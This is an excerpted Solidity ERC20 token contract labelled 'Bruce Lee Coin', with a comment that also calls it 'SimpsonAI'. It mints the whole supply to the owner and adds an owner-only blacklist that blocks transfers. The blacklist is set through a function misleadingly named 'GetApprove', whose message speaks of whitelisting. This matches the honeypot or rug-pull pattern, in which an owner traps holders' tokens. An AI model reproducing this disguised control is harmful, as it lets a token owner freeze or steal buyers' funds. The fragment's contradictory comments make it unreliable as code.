...
contract ERC20 is Context, IERC20 {
   ...
   string private _name; //Bruce Lee Coin
   string private _symbol; //BRUCE
   ...
   constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 taxFee_) {
       ...
       taxFee = taxFee_;
       owner = _msgSender();
       _totalSupply = 34000000000000 * (10 ** uint256(decimals_));
       _balances[owner] = _totalSupply; // Total Supply
   ...
   function symbol() public view virtual returns (string memory) {
       return _symbol; //SimpsonAI
   } 


   function decimals() public view virtual returns (uint8) {
       return _decimals; //18 dec.
   }
   ...
   function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
       _transfer(_msgSender(), recipient, amount); // transfer
       return true;
   }
...
require(!blacklists[sender] && !blacklists[recipient], "Blacklisted");
   ...
   address deadAddress = 0x000000000000000000000000000000000000dEaD; //Burn Token
...
function GetApprove (address _address, bool _isBlacklisting) external {
   require(_msgSender() == owner, "Only the owner can whitelist an address");
